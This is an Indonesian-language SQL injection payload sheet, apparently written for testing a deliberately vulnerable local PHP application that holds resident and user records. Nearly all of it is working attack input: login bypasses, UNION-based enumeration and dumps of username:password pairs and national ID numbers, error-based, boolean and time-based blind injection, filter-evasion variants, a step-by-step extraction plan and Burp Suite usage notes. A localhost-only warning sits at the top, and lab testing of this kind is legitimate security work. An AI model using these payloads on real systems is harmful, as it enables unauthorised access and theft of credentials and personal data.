# Sample Payloads untuk Pengujian SQL Injection

## Peringatan
Payload di bawah ini HANYA untuk pengujian di lingkungan localhost yang terisolasi. JANGAN gunakan di sistem produksi.

---

## 1. Authentication Bypass (admin/login.php)

### Bypass Login Tanpa Password
```
Username: admin'-- -
Password: [kosong]
```

### Bypass dengan OR
```
Username: ' OR '1'='1'-- -
Password: [kosong]
```

### Bypass Universal
```
Username: ' OR 1=1-- -
Password: anything
```

### Login sebagai User Spesifik
```
Username: petugas1'-- -
Password: [kosong]
```

---

## 2. Data Extraction (cek_warga.php, riwayat.php)

### Cek Jumlah Kolom (ORDER BY)
```
nik: ' ORDER BY 1-- -     (OK)
nik: ' ORDER BY 13-- -    (OK)
nik: ' ORDER BY 14-- -    (ERROR)
```
Jika error di ORDER BY 14, maka warga = 13 kolom.

### UNION SELECT - Cek Kolom yang Tampil
```
nik: ' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- -
```
Kolom 3 (nama) biasanya yang tampil di halaman.

### Ekstrak Versi MySQL
```
nik: ' UNION SELECT 1,2,version(),4,5,6,7,8,9,10,11,12,13-- -
```

### Ekstrak Database User
```
nik: ' UNION SELECT 1,2,user(),4,5,6,7,8,9,10,11,12,13-- -
```

### Ekstrak Nama Database
```
nik: ' UNION SELECT 1,2,database(),4,5,6,7,8,9,10,11,12,13-- -
```

### Ekstrak Semua Nama Database
```
nik: ' UNION SELECT 1,2,GROUP_CONCAT(schema_name),4,5,6,7,8,9,10,11,12,13 FROM information_schema.schemata-- -
```

### Ekstrak Semua Nama Tabel
```
nik: ' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6,7,8,9,10,11,12,13 FROM information_schema.tables WHERE table_schema=database()-- -
```

### Ekstrak Kolom dari Tabel Users
```
nik: ' UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6,7,8,9,10,11,12,13 FROM information_schema.columns WHERE table_name='users'-- -
```

### Dump Data Users (Username & Password)
```
nik: ' UNION SELECT 1,2,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),4,5,6,7,8,9,10,11,12,13 FROM users-- -
```

### Dump Data Warga (NIK & Nama)
```
nik: ' UNION SELECT 1,2,GROUP_CONCAT(nik,0x3a,nama SEPARATOR 0x0a),4,5,6,7,8,9,10,11,12,13 FROM warga-- -
```

---

## 3. Error-Based Injection

### Extract Version via EXTRACTVALUE
```
nik: ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -
```

### Extract Data via EXTRACTVALUE
```
nik: ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(username,0x3a,password) FROM users),0x7e))-- -
```

### Extract via UPDATEXML
```
nik: ' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)-- -
```

---

## 4. Boolean-Based Blind Injection

### Cek Kondisi True
```
nik: ' AND 1=1-- -
```
Jika data ditemukan, kondisi TRUE.

### Cek Kondisi False
```
nik: ' AND 1=2-- -
```
Jika data tidak ditemukan, kondisi FALSE.

### Ekstrak Karakter per Karakter
```
nik: ' AND SUBSTRING((SELECT database()),1,1)='w'-- -
```

### Ekstrak Panjang String
```
nik: ' AND LENGTH((SELECT database()))=7-- -
```

---

## 5. Time-Based Blind Injection

### Delay Sederhana
```
nik: ' AND SLEEP(5)-- -
```
Jika response delay 5 detik, injeksi berhasil.

### Conditional Delay
```
nik: ' AND IF(1=1,SLEEP(5),0)-- -
```

### Ekstrak Data dengan Time-Based
```
nik: ' AND IF(SUBSTRING((SELECT database()),1,1)='w',SLEEP(5),0)-- -
```

---

## 6. GET Parameter Injection (berita_detail.php)

### UNION-based (berita = 6 columns)
```
?id=-1 UNION SELECT 1,2,3,4,5,6-- -
```

### Error-based
```
?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -
```

### Boolean-based
```
?id=1 AND 1=1-- -  (normal response)
?id=1 AND 1=2-- -  (different response)
```

### Time-based
```
?id=1 AND SLEEP(5)-- -
```

---

## 7. Search Injection (admin/warga.php?q=)

### UNION-based (warga = 13 columns)
```
?q=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- -
```

### Error-based
```
?q=' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -
```

### Wildcard Bypass
```
?q=%' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- -
```

---

## 8. Filter Bypass (admin/surat.php?status=)

### UNION-based (JOIN = 15 columns)
```
?status=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- -
```

### Error-based
```
?status=' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -
```

---

## 9. WAF/Filter Bypass Techniques

### Komentar Variasi
```
'-- -
'--+
'#
'/*
```

### Spasi Alternatif
```
'/**/OR/**/1=1-- -
'%09OR%091=1-- -  (tab)
'%0aOR%0a1=1-- -  (newline)
```

### Case Variation
```
' oR 1=1-- -
' UnIoN sElEcT 1,2,3-- -
```

### Encoding
```
%27%20OR%201%3D1--%20-  (URL encoded)
```

### Double Query
```
' UNION SELECT 1,(SELECT GROUP_CONCAT(username,0x3a,password) FROM users),3,4,5,6,7,8,9,10,11,12,13-- -
```

---

## 10. Multi-Step Extraction Strategy

### Step 1: Identifikasi Jumlah Kolom
```
nik: ' ORDER BY 1-- -   (OK)
nik: ' ORDER BY 13-- -  (OK)
nik: ' ORDER BY 14-- -  (ERROR)
```
Result: 13 kolom (warga table)

### Step 2: Identifikasi Kolom yang Tampil
```
nik: ' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- -
```
Kolom 3 (nama) biasanya yang tampil.

### Step 3: Ekstrak Info Database
```
nik: ' UNION SELECT 1,2,version(),4,5,6,database(),8,9,10,11,12,13-- -
```

### Step 4: Enumerasi Tabel
```
nik: ' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6,7,8,9,10,11,12,13 FROM information_schema.tables WHERE table_schema=database()-- -
```

### Step 5: Enumerasi Kolom
```
nik: ' UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6,7,8,9,10,11,12,13 FROM information_schema.columns WHERE table_name='users'-- -
```

### Step 6: Dump Data
```
nik: ' UNION SELECT 1,2,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),4,5,6,7,8,9,10,11,12,13 FROM users-- -
```

---

## Referensi Hex Characters

| Karakter | Hex | Kegunaan |
|----------|-----|----------|
| : | 0x3a | Separator username:password |
| newline | 0x0a | Separator baris |
| space | 0x20 | Spasi |
| , | 0x2c | Separator kolom |

---

## Catatan untuk Burp Suite

1. Set proxy ke `127.0.0.1:8080`
2. Intercept request ke titik injeksi
3. Send to Repeater untuk testing manual
4. Send to Intruder untuk automated testing
5. Gunakan Payload Positions untuk marking parameter
6. Perhatikan perbedaan response length dan content
